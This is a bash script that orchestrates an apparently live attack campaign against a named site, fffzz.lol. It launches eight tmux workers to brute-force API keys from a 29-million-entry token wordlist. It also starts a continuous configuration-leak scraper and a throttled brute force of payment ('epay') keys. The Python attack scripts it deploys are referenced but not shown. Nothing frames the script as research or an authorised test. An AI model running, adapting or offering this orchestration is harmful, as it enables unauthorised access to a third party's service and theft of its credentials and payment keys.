#!/bin/bash
# Launch HK full attack: API Key (29M) + config leak + epay slow
set -euo pipefail

OUT=/data/automation/results/fffzz.lol/kami_allin_20260717
BIN=/data/automation/bin
WL=/data/wordlists/faka-tokens.txt
EPAY=/data/wordlists/epay-keys.txt
TOTAL=29452734
WORKERS=8
CHUNK=$((TOTAL / WORKERS))

mkdir -p "$OUT" "$BIN"

# Stop old SYS_KEY workers
for s in ff-hk-0 ff-hk-500000 ff-hk-1000000 ff-hk-1500000; do
  tmux kill-session -t "$s" 2>/dev/null || true
done

# Deploy scripts from workspace if present
if [ -f /tmp/fffzz_api_brute_resilient.py ]; then
  cp /tmp/fffzz_api_brute_resilient.py "$BIN/"
  cp /tmp/fffzz_config_leak.py "$BIN/"
  cp /tmp/fffzz_epay_slow.py "$BIN/"
fi

chmod +x "$BIN"/*.py 2>/dev/null || true

# API Key brute — 8 workers across full 29M dict
for w in $(seq 0 $((WORKERS - 1))); do
  START=$((w * CHUNK))
  tmux kill-session -t "ff-api-$w" 2>/dev/null || true
  tmux new-session -d -s "ff-api-$w" \
    "python3 $BIN/fffzz_api_brute_resilient.py $WL $START $CHUNK 25 $w $OUT 2>&1 | tee -a $OUT/api_hk_w${w}.log"
done

# Config leak — continuous
tmux kill-session -t ff-leak 2>/dev/null || true
tmux new-session -d -s ff-leak \
  "python3 $BIN/fffzz_config_leak.py $OUT 2>&1 | tee -a $OUT/config_leak.log"

# Epay slow — 2 req/min effective, first 500k lines
tmux kill-session -t ff-epay 2>/dev/null || true
tmux new-session -d -s ff-epay \
  "python3 $BIN/fffzz_epay_slow.py $EPAY 500000 $OUT 2.0 2>&1 | tee -a $OUT/epay_slow.log"

echo "HK launched: ff-api-0..$((WORKERS-1)), ff-leak, ff-epay"
tmux ls | grep -E 'ff-api|ff-leak|ff-epay' || true
